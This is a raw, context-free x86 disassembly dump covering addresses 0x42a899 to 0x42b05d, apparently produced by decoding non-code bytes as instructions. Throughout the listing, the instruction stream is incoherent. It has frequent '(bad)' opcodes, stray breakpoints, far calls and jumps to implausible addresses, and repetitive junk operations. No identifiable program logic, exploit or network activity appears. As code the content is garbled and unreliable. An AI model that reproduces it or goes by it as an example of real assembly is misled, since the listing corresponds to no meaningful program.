  42a899:	inc    eax
  42a89a:	call   FWORD PTR [esi-0xc3]
  42a8a0:	fs retf 
  42a8a2:	dec    edx
  42a8a4:	mov    ah,0x83
  42a8a6:	(bad)  
  42a8a7:	(bad)  
  42a8a8:	in     eax,dx
  42a8a9:	xor    eax,0xff91b5ff
  42a8ae:	inc    DWORD PTR [eax]
  42a8b0:	push   0x62
  42a8b2:	(bad)  
  42a8b3:	mov    ebx,0xffffff86
  42a8b8:	pop    ebp
  42a8b9:	sbb    eax,0x83e53900
  42a8be:	(bad)  
  42a8bf:	call   edx
  42a8c1:	xchg   ebp,eax
  42a8c2:	call   DWORD PTR [esi-0x760000df]
  42a8c8:	(bad)  
  42a8c9:	and    al,BYTE PTR [ebx-0x9558]
  42a8cf:	add    BYTE PTR [edx+0x75],ch
  42a8d2:	add    BYTE PTR [edi+0x6e],ah
  42a8d5:	add    BYTE PTR [eax],al
  42a8d7:	add    BYTE PTR [eax+eax*4-0x266d34],bh
  42a8de:	add    BYTE PTR [eax],al
  42a8e0:	inc    edi
  42a8e1:	sar    bh,0xb5
  42a8e4:	jnp    0x42a8e6
  42a8e6:	add    bh,bh
  42a8e8:	daa    
  42a8e9:	or     al,0xff
  42a8eb:	xor    DWORD PTR [eax],0xffffffff
  42a8ee:	add    bh,bh
  42a8f0:	test   eax,0x8ba70026
  42a8f5:	inc    DWORD PTR [eax]
  42a8f7:	add    BYTE PTR ds:0xaca600bb,ch
  42a8fd:	int3   
  42a8fe:	add    bh,bh
  42a900:	jmp    0x42a8be
  42a902:	call   FWORD PTR [eax+0x4]
  42a905:	add    bh,bh
  42a907:	cmp    DWORD PTR [esi+0x5ba1ff06],0xffffffff
  42a90e:	(bad)  
  42a90f:	dec    edx
  42a911:	ds dec edi
  42a914:	add    edi,edi
  42a916:	add    BYTE PTR [ebx+0x1ffbe1c],al
  42a91c:	dec    esp
  42a91d:	mov    DWORD PTR [ebx-0x7c927300],eax
  42a923:	xchg   esi,eax
  42a924:	adc    al,0xff
  42a926:	inc    DWORD PTR [ebx+0x4dff878a]
  42a92c:	jne    0x42a92d
  42a92e:	add    ah,cl
  42a930:	test   BYTE PTR [ebp+0x9010ff],al
  42a936:	int3   
  42a937:	add    BYTE PTR [esp+edx*2-0x7c70707d],bh
  42a93e:	add    bh,bh
  42a940:	icebp  
  42a941:	adc    edi,edi
  42a943:	fidiv  WORD PTR [edi-0x4330001]
  42a949:	sar    edi,1
  42a94b:	mov    eax,ds:0xffffca
  42a950:	jbe    0x42a951
  42a952:	mov    DWORD PTR [esi-0xff7cdc],esp
  42a958:	ret    0xccda
  42a95b:	das    
  42a95c:	dec    DWORD PTR es:[ecx-0xbe4b01]
  42a963:	fsubr  QWORD PTR [edi+edi*8-0x4980100]
  42a96a:	mov    DWORD PTR [edi+0x17],ecx
  42a96d:	inc    DWORD PTR [ebx-0xf09e7d]
  42a973:	pusha  
  42a974:	pop    esp
  42a975:	inc    DWORD PTR [ebx-0xd39b00]
  42a97b:	jp     0x42a9c1
  42a97d:	add    BYTE PTR [ebx+0xdaa200],al
  42a983:	dec    esp
  42a984:	bswap  esp
  42a986:	or     esp,0xffffffb7
  42a989:	(bad)  
  42a98a:	call   FWORD PTR [ebx-0x54]
  42a98d:	int3   
  42a98e:	add    BYTE PTR [eax],al
  42a990:	adc    esi,DWORD PTR [esp+ecx*8+0x65]
  42a994:	cwde   
  42a995:	inc    DWORD PTR [ebx-0x3345347d]
  42a99b:	mov    al,ds:0xffff1b
  42a9a0:	aas    
  42a9a1:	add    BYTE PTR [ecx-0x762a87],cl
  42a9a7:	add    ah,bl
  42a9a9:	mov    ebp,0x898881cc
  42a9ae:	inc    DWORD PTR [eax]
  42a9b0:	stos   BYTE PTR es:[edi],al
  42a9b1:	inc    esp
  42a9b2:	add    BYTE PTR [edi-0x5f],bl
  42a9b5:	(bad)  
  42a9b6:	dec    esp
  42a9b8:	fild   QWORD PTR [ebp-0xd2fd00]
  42a9be:	inc    DWORD PTR [eax]
  42a9c0:	jmp    0x8b21aa94
  42a9c5:	or     DWORD PTR [ecx-0x1017d],0x48
  42a9cc:	mov    BYTE PTR [eax],0xff
  42a9cf:	int3   
  42a9d0:	(bad)  
  42a9d1:	scas   eax,DWORD PTR es:[edi]
  42a9d2:	add    cl,bl
  42a9d4:	(bad)  
  42a9d6:	inc    DWORD PTR [ebx-0x3600981d]
  42a9dc:	add    edi,edi
  42a9de:	mov    edi,edi
  42a9e0:	adc    eax,DWORD PTR [esi]
  42a9e2:	call   FWORD PTR [ecx+0xffe6]
  42a9e8:	(bad)  
  42a9e9:	sar    edi,1
  42a9eb:	scas   eax,DWORD PTR es:[edi]
  42a9ec:	adc    ecx,DWORD PTR [ecx+0x27e100ff]
  42a9f2:	call   ebx
  42a9f4:	push   cs
  42a9f5:	inc    DWORD PTR [eax]
  42a9f7:	add    BYTE PTR [ecx-0x6d],cl
  42a9fa:	mov    DWORD PTR [ebx],edi
  42a9fc:	xchg   ecx,eax
  42a9fd:	dec    DWORD PTR [ecx-0x6f5900]
  42aa03:	std    
  42aa04:	jbe    0x42a9d2
  42aa06:	inc    DWORD PTR [eax]
  42aa08:	adc    al,0xbe
  42aa0a:	dec    ebx
  42aa0c:	lahf   
  42aa0d:	add    bh,bh
  42aa0f:	add    DWORD PTR [edx],0xffffffe5
  42aa12:	add    BYTE PTR [eax],dl
  42aa14:	and    bh,bh
  42aa16:	dec    DWORD PTR [ecx-0x47007fe6]
  42aa1c:	leave  
  42aa1d:	(bad)  
  42aa1e:	(bad)  
  42aa1f:	call   DWORD PTR [ecx+edi*8]
  42aa22:	(bad)  
  42aa23:	cmp    ecx,DWORD PTR [edi+0x0]
  42aa26:	add    BYTE PTR [eax],al
  42aa28:	sahf   
  42aa29:	dec    ebx
  42aa2a:	add    esi,0x4c
  42aa2d:	inc    DWORD PTR [eax]
  42aa2f:	push   DWORD PTR [ebp-0x71070019]
  42aa35:	or     esp,0xffffffff
  42aa38:	add    DWORD PTR [esi-0x7c70a901],edx
  42aa3e:	(bad)  
  42aa3f:	dec    DWORD PTR [edx]
  42aa41:	(bad)  
  42aa43:	retf   0xffe0
  42aa46:	(bad)  
  42aa47:	inc    DWORD PTR [ebp-0x7ea2ffe2]
  42aa4d:	inc    DWORD PTR [eax]
  42aa4f:	(bad)  
  42aa50:	jl     0x42aa70
  42aa52:	add    BYTE PTR [ebp-0x24],bh
  42aa55:	inc    DWORD PTR [eax]
  42aa57:	add    BYTE PTR [esi-0x52],bl
  42aa5a:	add    BYTE PTR [eax],cl
  42aa5c:	ret    
  42aa5d:	inc    DWORD PTR [eax]
  42aa5f:	mov    DWORD PTR [eax],eax
  42aa61:	hlt    
  42aa62:	add    esp,0x7d
  42aa65:	(bad)  
  42aa66:	(bad)  
  42aa67:	jmp    DWORD PTR [eax+eax*2-0x62db00]
  42aa6e:	(bad)  
  42aa6f:	jmp    DWORD PTR [ecx]
  42aa71:	arpl   WORD PTR [ebx+0xff7458],ax
  42aa77:	add    BYTE PTR [edi+0x69],dh
  42aa7a:	add    BYTE PTR [esp+eiz*8-0x7d],dl
  42aa7e:	add    BYTE PTR [ebx-0x7f7c016d],al
  42aa84:	jns    0x42aa86
  42aa86:	inc    DWORD PTR [eax]
  42aa88:	sbb    BYTE PTR [eax],0xff
  42aa8b:	cld    
  42aa8c:	sbb    BYTE PTR [eax],al
  42aa8e:	inc    DWORD PTR [ebx+0x3fff1c76]
  42aa94:	imul   eax,DWORD PTR [eax],0x6c1800cc
  42aa9a:	jmp    DWORD PTR [edi]
  42aa9c:	or     eax,0xe783ffff
  42aaa1:	mov    ds:0xff9cf700,eax
  42aaa6:	int3   
  42aaa7:	mov    DWORD PTR [eax-0x669e0039],esi
  42aaad:	add    BYTE PTR [eax],al
  42aaaf:	dec    eax
  42aab1:	sub    eax,0xcc9bc9ff
  42aab6:	add    DWORD PTR [ebx+0x200d3d9],0x6b
  42aabd:	add    DWORD PTR [ebx-0x7c212901],0x2a
  42aac4:	push   ds
  42aac5:	(bad)  
  42aac6:	(bad)  
  42aac7:	call   DWORD PTR [edx+0x302400b7]
  42aacd:	add    BYTE PTR [eax],al
  42aacf:	add    bl,bl
  42aad1:	or     eax,0xff267f00
  42aad6:	(bad)  
  42aad7:	push   edx
  42aad9:	fcmove st,st(4)
  42aadb:	mov    al,0x95
  42aadd:	dec    esp
  42aadf:	cmp    DWORD PTR [eax+0x35ceff7d],0xffffffff
  42aae6:	mov    DWORD PTR [eax],eax
  42aae8:	xchg   esi,edx
  42aaea:	(bad)  
  42aaeb:	mov    edx,0xffccae
  42aaf0:	inc    esp
  42aaf1:	dec    ebp
  42aaf2:	(bad)  
  42aaf3:	mov    esp,0xffff11
  42aaf8:	adc    eax,0xdf27ff25
  42aafd:	add    BYTE PTR [eax],al
  42aaff:	mov    esp,ebx
  42ab01:	outs   dx,BYTE PTR ds:[esi]
  42ab02:	add    BYTE PTR [edx],al
  42ab04:	and    BYTE PTR [ebx-0x763eff7d],al
  42ab0a:	call   FWORD PTR [eax+0x79]
  42ab0d:	dec    DWORD PTR [ecx-0x7c1d5634]
  42ab13:	dec    eax
  42ab14:	sbb    BYTE PTR [ebx-0x45da0034],al
  42ab1a:	adc    DWORD PTR [eax],0x4a
  42ab1d:	inc    DWORD PTR [eax]
  42ab1f:	or     DWORD PTR [edx+0x6],0xffffffff
  42ab23:	fwait
  42ab24:	pushf  
  42ab25:	int3   
  42ab26:	add    bh,bh
  42ab28:	ja     0x42ab8e
  42ab2a:	int3   
  42ab2b:	and    al,BYTE PTR [eax-0x1]
  42ab2e:	dec    DWORD PTR [ecx-0x4d7c3553]
  42ab34:	aam    0xff
  42ab36:	mov    DWORD PTR [eax],eax
  42ab38:	scas   eax,DWORD PTR es:[edi]
  42ab39:	ret    
  42ab3a:	add    dh,cl
  42ab3c:	sbb    edi,edi
  42ab3e:	inc    DWORD PTR [ebx-0x487c8273]
  42ab44:	mov    ecx,0x61ffcc83
  42ab49:	mov    dh,0xff
  42ab4b:	jns    0x42abb1
  42ab4d:	int3   
  42ab4e:	(bad)  
  42ab4f:	jmp    ebp
  42ab51:	jmp    0x0:0x39a200
  42ab58:	(bad)  
  42ab59:	push   DWORD PTR es:[esi+0xcc8976]
  42ab60:	xor    bl,BYTE PTR [eax-0x7d]
  42ab63:	sbb    esp,0xffffff83
  42ab66:	add    DWORD PTR [eax],0x3a
  42ab69:	call   0x898b893a
  42ab6e:	int3   
  42ab6f:	add    BYTE PTR [ebx-0x1b],ah
  42ab72:	add    BYTE PTR [edx+0x45],cl
  42ab75:	add    BYTE PTR [ecx-0xb42434],cl
  42ab7b:	and    ecx,edx
  42ab7d:	cmp    edi,0xffffffff
  42ab80:	or     BYTE PTR [edi+edi*8],al
  42ab83:	xchg   ebx,eax
  42ab84:	in     al,0x0
  42ab86:	inc    DWORD PTR [eax]
  42ab88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab89:	aam    0xff
  42ab8b:	rol    DWORD PTR [esi+0xd000000],1
  42ab91:	add    BYTE PTR [eax],0xad
  42ab94:	push   0xffffff83
  42ab96:	cmp    edi,0x38
  42ab99:	pop    ebp
  42ab9a:	(bad)  
  42ab9b:	jmp    0x43ab58
  42aba0:	sub    eax,0x49feff05
  42aba5:	dec    DWORD PTR [ecx-0x7cccb677]
  42abab:	shl    ah,0x83
  42abae:	dec    esp
  42abb0:	inc    ebp
  42abb1:	je     0x42abb2
  42abb3:	xchg   edi,eax
  42abb4:	inc    ebp
  42abb5:	dec    DWORD PTR [ecx+0x4a3bff]
  42abbb:	pop    ds
  42abbc:	jo     0x42ab41
  42abbe:	inc    DWORD PTR [ebx+0x7f00541d]
  42abc4:	inc    BYTE PTR [eax]
  42abc6:	add    bh,bh
  42abc8:	mov    BYTE PTR [eax],0xff
  42abcb:	daa    
  42abcc:	pusha  
  42abcd:	(bad)  
  42abce:	(bad)  
  42abcf:	(bad)  
  42abd0:	mov    edi,0x52d000c7
  42abd5:	int3   
  42abd6:	dec    DWORD PTR [ecx+0x2003cdd]
  42abdc:	cmp    al,0xcc
  42abde:	(bad)  
  42abdf:	inc    DWORD PTR [edx-0x3926009d]
  42abe5:	add    bh,bh
  42abe7:	or     DWORD PTR [ebx],0x78
  42abea:	(bad)  
  42abeb:	out    dx,al
  42abec:	(bad)  
  42abed:	inc    DWORD PTR [eax]
  42abef:	mov    ebx,eax
  42abf1:	ret    0xff00
  42abf4:	sar    edi,1
  42abf6:	add    BYTE PTR [ebx+0x3ffc2aa],al
  42abfc:	cmp    BYTE PTR [eax],al
  42abfe:	mov    edi,edi
  42ac00:	push   ds
  42ac01:	jae    0x42ab86
  42ac03:	push   cx
  42ac05:	inc    DWORD PTR [eax]
  42ac07:	int3   
  42ac08:	fild   QWORD PTR [ecx+0x0]
  42ac0b:	inc    eax
  42ac0c:	(bad)  
  42ac0e:	(bad)  
  42ac0f:	push   DWORD PTR [ecx+0x6e]
  42ac12:	call   DWORD PTR [edx+0xfffff6]
  42ac18:	cmc    
  42ac19:	mov    cl,ah
  42ac1b:	cmp    DWORD PTR [edi+edi*8-0x1],ebx
  42ac1f:	sub    ebx,0x51
  42ac22:	call   DWORD PTR [esi-0x7600764c]
  42ac28:	adc    BYTE PTR [edx-0x1],ch
  42ac2b:	dec    esi
  42ac2c:	push   es
  42ac2d:	add    DWORD PTR [eax],0xffffffff
  42ac30:	add    BYTE PTR cs:[bx+di],bl
  42ac34:	sub    DWORD PTR [ebx-0x1b450034],eax
  42ac3a:	int3   
  42ac3b:	sbb    BYTE PTR [edi+edi*8+0x3298ff89],0xff
  42ac43:	cmc    
  42ac44:	add    BYTE PTR [eax],0x89
  42ac47:	jmp    DWORD PTR [edi]
  42ac49:	xchg   ecx,eax
  42ac4a:	add    BYTE PTR [ebp-0x33000062],bh
  42ac50:	xor    eax,0xcc81895d
  42ac55:	inc    DWORD PTR [ebx+0x2a1ff]
  42ac5b:	fmulp  st(2),st
  42ac5d:	dec    esp
  42ac5f:	int3   
  42ac60:	jecxz  0x42acc7
  42ac62:	call   DWORD PTR [edi+edx*8]
  42ac65:	cmp    edi,0x0
  42ac68:	xor    al,0x46
  42ac6a:	add    cl,dl
  42ac6c:	sbb    ecx,DWORD PTR [ecx+0x655b00ff]
  42ac72:	xor    DWORD PTR [edx-0x32],0xffffff83
  42ac76:	cmp    edi,0x12
  42ac79:	cmp    eax,0xff128c00
  42ac7e:	add    bh,bh
  42ac80:	fwait
  42ac81:	(bad)  
  42ac82:	int3   
  42ac83:	imul   ebp,DWORD PTR [eax+0x40ffffff],0xd3aff52
  42ac8d:	add    DWORD PTR [eax],0xffffffff
  42ac90:	xor    BYTE PTR [ebx-0x33afe501],bl
  42ac96:	int3   
  42ac97:	add    BYTE PTR [eax+0x9],cl
  42ac9a:	dec    ecx
  42ac9c:	ds add bh,bh
  42ac9f:	add    BYTE PTR [eax+0x48],dh
  42aca2:	add    bl,ch
  42aca4:	mov    cl,0x83
  42aca6:	inc    DWORD PTR [eax]
  42aca8:	or     al,0x23
  42acaa:	sbb    DWORD PTR [ecx-0x75],0xffffffff
  42acae:	add    DWORD PTR [eax],0x51
  42acb1:	int3   
  42acb2:	sub    esp,0xffffffe7
  42acb5:	inc    DWORD PTR [eax]
  42acb7:	dec    DWORD PTR [edi+0x1a]
  42acba:	add    BYTE PTR [eax-0x18],bh
  42acbd:	(bad)  
  42acbe:	inc    DWORD PTR [ebx-0x2f00d594]
  42acc4:	pop    edi
  42acc5:	inc    DWORD PTR [eax]
  42acc7:	add    DWORD PTR [ebp+0x3880046],0xffffff83
  42acce:	inc    DWORD PTR [ebx-0x19ff1637]
  42acd4:	iret   
  42acd5:	int3   
  42acd6:	dec    esp
  42acd8:	adc    al,BYTE PTR [edi+edi*8-0x73]
  42acdc:	push   esi
  42acdd:	add    BYTE PTR [ecx-0x7ca04201],cl
  42ace3:	retf   0xcc45
  42ace6:	add    DWORD PTR [eax],0xffffffd1
  42ace9:	add    ecx,esp
  42aceb:	add    esp,DWORD PTR [eax]
  42aced:	inc    DWORD PTR [eax]
  42acef:	mov    esp,eax
  42acf1:	in     al,0x89
  42acf3:	sub    eax,0xccff8948
  42acf8:	(bad)  
  42acf9:	into   
  42acfa:	and    ecx,0xffffffc3
  42acfd:	inc    DWORD PTR [eax]
  42acff:	add    BYTE PTR [eax-0xa],bl
  42ad02:	call   DWORD PTR [ecx]
  42ad04:	int    0xff
  42ad06:	cmp    edi,0x78
  42ad09:	xchg   edi,eax
  42ad0a:	jmp    FWORD PTR [ebp+0x20]
  42ad0d:	add    DWORD PTR [eax],0xffffffff
  42ad10:	outs   dx,DWORD PTR ds:[esi]
  42ad11:	ins    DWORD PTR es:[edi],dx
  42ad12:	and    DWORD PTR [ecx+0x48],0xffffffff
  42ad16:	dec    esp
  42ad18:	sub    BYTE PTR [edx],cl
  42ad1a:	inc    DWORD PTR [ecx]
  42ad1c:	out    0xff,al
  42ad1e:	add    bh,bh
  42ad20:	inc    ecx
  42ad21:	jne    0x42ad22
  42ad23:	xor    al,BYTE PTR [eax-0x1]
  42ad26:	add    BYTE PTR [eax],al
  42ad28:	jecxz  0x42ad17
  42ad2a:	mov    DWORD PTR [ebx],edi
  42ad2c:	hlt    
  42ad2d:	inc    DWORD PTR [eax]
  42ad2f:	push   eax
  42ad31:	dec    esp
  42ad32:	sbb    DWORD PTR [ebp-0xff00a5],0x44
  42ad39:	inc    edx
  42ad3a:	add    BYTE PTR [esi],al
  42ad3c:	or     eax,0x29ffffff
  42ad41:	mov    eax,ds:0xff60c7ff
  42ad46:	(bad)  
  42ad47:	inc    DWORD PTR [ebx+0x122ffa7]
  42ad4d:	(bad)  
  42ad4e:	(bad)  
  42ad4f:	push   esp
  42ad51:	or     DWORD PTR [ebx-0x33ec61],eax
  42ad57:	add    dh,dl
  42ad59:	aaa    
  42ad5a:	dec    DWORD PTR [ecx+esi*1]
  42ad5d:	(bad)  
  42ad5e:	(bad)  
  42ad5f:	call   DWORD PTR [edi-0x37657caf]
  42ad65:	(bad)  
  42ad66:	(bad)  
  42ad67:	push   DWORD PTR [ecx+0x41]
  42ad6a:	call   FWORD PTR [ebx-0xffff95]
  42ad70:	sub    ebp,eax
  42ad72:	dec    DWORD PTR [esi+0x8300fa]
  42ad78:	cmp    eax,0x3fd5007f
  42ad7d:	mov    DWORD PTR [ecx-0x686101],ecx
  42ad83:	mov    DWORD PTR [ebp-0x1],esp
  42ad86:	(bad)  
  42ad87:	call   DWORD PTR [ebx-0x7e757cc4]
  42ad8d:	(bad)  
  42ad8e:	inc    DWORD PTR [eax]
  42ad90:	xor    ch,dh
  42ad92:	add    BYTE PTR [edx-0x7c00f2],bh
  42ad98:	(bad)  
  42ad99:	fadd   QWORD PTR [eax]
  42ad9b:	into   
  42ad9c:	pop    es
  42ad9d:	(bad)  
  42ad9e:	inc    DWORD PTR [eax]
  42ada0:	cdq    
  42ada1:	mov    bl,0xff
  42ada3:	xchg   esi,eax
  42ada4:	and    edi,edi
  42ada6:	add    bh,bh
  42ada8:	sub    al,0x52
  42adaa:	jmp    DWORD PTR [esi]
  42adac:	fcos   
  42adae:	add    bh,bh
  42adb0:	adc    eax,0x847eff4d
  42adb5:	dec    esp
  42adb7:	jmp    esp
  42adb9:	lods   eax,DWORD PTR ds:[esi]
  42adba:	dec    DWORD PTR [ebp-0x26]
  42adbd:	cmp    edi,0x0
  42adc0:	or     ah,al
  42adc2:	push   DWORD PTR [ecx+0x5]
  42adc5:	(bad)  
  42adc6:	inc    DWORD PTR [ebx+0x7ffa877]
  42adcc:	icebp  
  42adcd:	(bad)  
  42adce:	(bad)  
  42adcf:	(bad)  
  42add0:	mov    eax,0xf2f4835f
  42add5:	int3   
  42add6:	inc    DWORD PTR [ebx+0x4eff691b]
  42addc:	dec    edi
  42addd:	mov    edi,edi
  42addf:	call   FWORD PTR [eax+0x40900e4]
  42ade5:	(bad)  
  42ade6:	(bad)  
  42ade7:	call   DWORD PTR [esi-0x55]
  42adea:	call   DWORD PTR [esi+0xffef]
  42adf0:	pop    ds
  42adf1:	lahf   
  42adf2:	inc    DWORD PTR [ebx+0xff00a9]
  42adf8:	mov    esp,0xd4b898f
  42adfd:	add    BYTE PTR [ebx-0x7c165e01],al
  42ae03:	adc    BYTE PTR [ecx-0x66000001],bh
  42ae09:	sub    eax,0x896e69cc
  42ae0e:	cmp    edi,0xffffffc7
  42ae11:	or     esp,0xff8359db
  42ae17:	inc    DWORD PTR ds:0x103d0058
  42ae1d:	(bad)  
  42ae1e:	inc    DWORD PTR [eax]
  42ae20:	mov    ah,0xb3
  42ae22:	int3   
  42ae23:	outs   dx,BYTE PTR ds:[esi]
  42ae24:	lea    eax,[eax]
  42ae26:	int3   
  42ae27:	adc    DWORD PTR ds:0xba89ff46,0xffffffff
  42ae2e:	add    bh,bh
  42ae30:	cmp    DWORD PTR [ebx+0x0],ebx
  42ae33:	retf   0x83c3
  42ae36:	(bad)  
  42ae37:	(bad)  
  42ae38:	jns    0x42ae31
  42ae3a:	call   FWORD PTR [ecx+0x7e]
  42ae3d:	int3   
  42ae3e:	add    bh,bh
  42ae40:	and    al,0x14
  42ae42:	call   DWORD PTR [ebp-0x33ff11]
  42ae48:	push   esp
  42ae49:	adc    DWORD PTR [eax],eax
  42ae4b:	push   ss
  42ae4c:	add    al,0x83
  42ae4e:	add    bh,bh
  42ae50:	add    BYTE PTR [ebx+0xb110ff],dl
  42ae56:	inc    DWORD PTR [eax]
  42ae58:	xchg   dl,ah
  42ae5a:	and    DWORD PTR [edi+0x62],0xffffffff
  42ae5e:	(bad)  
  42ae5f:	jmp    DWORD PTR [ecx+0x2e7cfffe]
  42ae65:	add    BYTE PTR [eax],al
  42ae67:	(bad)  
  42ae68:	mov    edx,0x1b4d008a
  42ae6d:	(bad)  
  42ae6e:	dec    DWORD PTR [ecx+0x5dff9083]
  42ae74:	jg     0x42ae76
  42ae76:	cmp    edi,0xffffffa1
  42ae79:	fs jmp ebx
  42ae7c:	push   esi
  42ae7d:	cmp    edi,0xffffffcc
  42ae80:	inc    edi
  42ae81:	cmp    bh,0xa9
  42ae84:	inc    esp
  42ae85:	add    BYTE PTR [eax],al
  42ae87:	sub    DWORD PTR [ebx],0x78
  42ae8a:	add    DWORD PTR [eax],0xffffff98
  42ae8d:	dec    esp
  42ae8f:	add    BYTE PTR [edi-0x18],ch
  42ae92:	dec    ecx
  42ae94:	jmp    0x42ae96
  42ae96:	int3   
  42ae97:	and    esp,0xfffffff3
  42ae9a:	inc    DWORD PTR [ebp-0x7cff00e6]
  42aea0:	sar    ebx,cl
  42aea2:	add    BYTE PTR [edx],bl
  42aea4:	push   esi
  42aea5:	(bad)  
  42aea6:	(bad)  
  42aea7:	jmp    FWORD PTR [ecx]
  42aea9:	pop    eax
  42aeaa:	dec    DWORD PTR [eax+ebp*2-0x7d]
  42aeae:	cmp    edi,0x50
  42aeb1:	in     al,0xff
  42aeb3:	adc    ecx,DWORD PTR [ecx]
  42aeb5:	mov    edi,edi
  42aeb7:	add    BYTE PTR [esi-0xb697c3a],bh
  42aebd:	add    bh,bh
  42aebf:	add    cl,ah
  42aec1:	aad    0xff
  42aec3:	retf   
  42aec4:	outs   dx,DWORD PTR ds:[esi]
  42aec5:	(bad)  
  42aec6:	(bad)  
  42aec7:	(bad)  
  42aec8:	cmp    edx,DWORD PTR [edi]
  42aeca:	cmp    DWORD PTR [ebx],0x49
  42aecd:	cmp    edi,0x0
  42aed0:	jmp    0xb5b432ae
  42aed5:	add    DWORD PTR [eax],0xffffffff
  42aed8:	shl    edx,cl
  42aeda:	(bad)  
  42aedb:	cmp    esp,DWORD PTR [ecx]
  42aedd:	(bad)  
  42aede:	inc    DWORD PTR [eax]
  42aee0:	pop    ebx
  42aee1:	add    BYTE PTR [eax],0xca
  42aee4:	xchg   ecx,eax
  42aee5:	int3   
  42aee6:	mov    DWORD PTR [eax],eax
  42aee8:	ret    0xff35
  42aeeb:	icebp  
  42aeec:	cli    
  42aeed:	(bad)  
  42aeee:	(bad)  
  42aeef:	call   DWORD PTR [ebx]
  42aef1:	sahf   
  42aef2:	adc    esi,0xffffffef
  42aef5:	inc    DWORD PTR [eax]
  42aef7:	dec    DWORD PTR [edi-0x17a2760c]
  42aefd:	(bad)  
  42aefe:	(bad)  
  42aeff:	(bad)  
  42af00:	jmp    0x42af03
  42af02:	call   FWORD PTR [ebp-0x9]
  42af05:	add    bh,bh
  42af07:	add    BYTE PTR [ecx],bl
  42af09:	cli    
  42af0a:	call   DWORD PTR [ecx+eax*1]
  42af0d:	(bad)  
  42af0e:	dec    esp
  42af10:	mov    eax,0x872f83c1
  42af15:	or     esp,0xffffff89
  42af18:	(bad)  
  42af19:	cmp    al,0x0
  42af1b:	pop    esp
  42af1c:	ins    BYTE PTR es:[edi],dx
  42af1d:	dec    DWORD PTR [ecx+0x5e3c89]
  42af23:	(bad)  
  42af24:	lods   al,BYTE PTR ds:[esi]
  42af25:	(bad)  
  42af26:	(bad)  
  42af27:	jmp    DWORD PTR [esp+ebp*4]
  42af2a:	jmp    DWORD PTR [esp+ecx*4+0x758900ff]
  42af31:	inc    edx
  42af32:	inc    DWORD PTR [ebx+eax*8+0x6dff0089]
  42af39:	sub    eax,DWORD PTR [ebx-0xffd5d9]
  42af3f:	int3   
  42af40:	add    bh,bh
  42af42:	add    BYTE PTR [eax+0xff0056],dl
  42af48:	inc    edx
  42af49:	aam    0xff
  42af4b:	test   eax,0xffffffd2
  42af50:	xchg   edx,eax
  42af51:	mov    esp,0xccde13ff
  42af56:	inc    DWORD PTR [ebx+0x4cff0607]
  42af5c:	add    DWORD PTR [eax],0x81fd00ff
  42af62:	push   DWORD PTR [edx]
  42af64:	daa    
  42af65:	add    bh,bh
  42af67:	jmp    ecx
  42af69:	mov    al,0x83
  42af6b:	push   ebx
  42af6c:	xchg   bh,bh
  42af6e:	or     esp,0x7c
  42af71:	jbe    0x42af73
  42af73:	lea    edx,[edi+edi*8]
  42af76:	add    DWORD PTR [eax],0xffffff99
  42af79:	(bad)  
  42af7a:	and    DWORD PTR [ecx],0x37
  42af7d:	(bad)  
  42af7e:	(bad)  
  42af7f:	dec    DWORD PTR [ebx]
  42af81:	(bad)  
  42af82:	jmp    DWORD PTR ds:0xff00ffaf
  42af88:	bound  edi,QWORD PTR [edx]
  42af8a:	add    BYTE PTR [ecx-0x3b],dl
  42af8d:	mov    DWORD PTR [eax],eax
  42af8f:	int3   
  42af90:	out    0xff,al
  42af92:	push   ebp
  42af94:	or     cl,BYTE PTR [ecx-0x74f10001]
  42af9a:	push   ecx
  42af9c:	stc    
  42af9d:	add    bh,bh
  42af9f:	jmp    FWORD PTR [esi+eax*4]
  42afa2:	inc    DWORD PTR [edi]
  42afa4:	std    
  42afa5:	inc    DWORD PTR [eax]
  42afa7:	call   DWORD PTR [esi]
  42afa9:	fild   DWORD PTR [ebx-0x7c002032]
  42afaf:	(bad)  
  42afb0:	mov    ebx,0x7cd9ff3d
  42afb5:	add    bh,bh
  42afb7:	add    BYTE PTR [esi+eax*1],dh
  42afba:	jmp    esi
  42afbc:	pusha  
  42afbd:	cmp    edi,0xffffffcc
  42afc0:	cwde   
  42afc1:	loopne 0x42afc3
  42afc3:	stos   BYTE PTR es:[edi],al
  42afc4:	mov    esp,0x1d00ffff
  42afc9:	fld    DWORD PTR [eax]
  42afcb:	pusha  
  42afcc:	xor    ecx,esp
  42afce:	add    BYTE PTR [eax],al
  42afd0:	data16 xor cl,BYTE PTR [ecx+0x374f]
  42afd7:	inc    DWORD PTR [ebp-0x21]
  42afda:	add    BYTE PTR [ecx],al
  42afdc:	cld    
  42afdd:	int3   
  42afde:	add    bh,bh
  42afe0:	push   ebx
  42afe1:	cmp    eax,0x89acf5ff
  42afe6:	(bad)  
  42afe7:	jmp    DWORD PTR [esi-0x64]
  42afea:	inc    DWORD PTR [ebp-0xff7cac]
  42aff0:	cli    
  42aff1:	call   0xffff:0x4a73ff
  42aff8:	push   ecx
  42aff9:	push   esp
  42affa:	add    DWORD PTR [eax-0x15],0xffffffcc
  42affe:	inc    DWORD PTR [eax]
  42b000:	(bad)  
  42b001:	out    dx,al
  42b002:	mov    esp,ebp
  42b004:	(bad)  
  42b005:	(bad)  
  42b006:	(bad)  
  42b007:	(bad)  
  42b008:	jg     0x42b085
  42b00a:	adc    DWORD PTR [esi],0xffffffe5
  42b00d:	add    bh,bh
  42b00f:	jmp    FWORD PTR [ecx-0x1c7e00bc]
  42b015:	add    BYTE PTR [eax],al
  42b017:	mov    DWORD PTR [ebp+0x56418369],ebp
  42b01d:	add    DWORD PTR [eax],0xffffffff
  42b020:	pushf  
  42b021:	dec    edi
  42b022:	add    BYTE PTR [ecx-0x4a],dl
  42b025:	add    bh,bh
  42b027:	cmp    ebx,0xffffffb1
  42b02a:	(bad)  
  42b02b:	jnp    0x42b0a5
  42b02d:	add    bh,bh
  42b02f:	inc    DWORD PTR [ebx+0x1c2cff6e]
  42b035:	add    bh,bh
  42b037:	sub    DWORD PTR [ecx+0x39],0xffffffcc
  42b03b:	pop    ebp
  42b03c:	lods   eax,DWORD PTR ds:[esi]
  42b03d:	add    BYTE PTR [eax],al
  42b03f:	or     ecx,0x25
  42b042:	(bad)  
  42b043:	in     eax,dx
  42b044:	pop    esi
  42b045:	inc    DWORD PTR [eax]
  42b047:	(bad)  
  42b048:	aas    
  42b049:	add    al,0x89
  42b04b:	inc    edx
  42b04c:	out    dx,al
  42b04d:	dec    esp
  42b04f:	add    BYTE PTR [eax+0x2c7cff83],cl
  42b055:	add    ah,cl
  42b057:	add    BYTE PTR [ebp-0x9347ca1],dl
  42b05d:	add    bh,bh
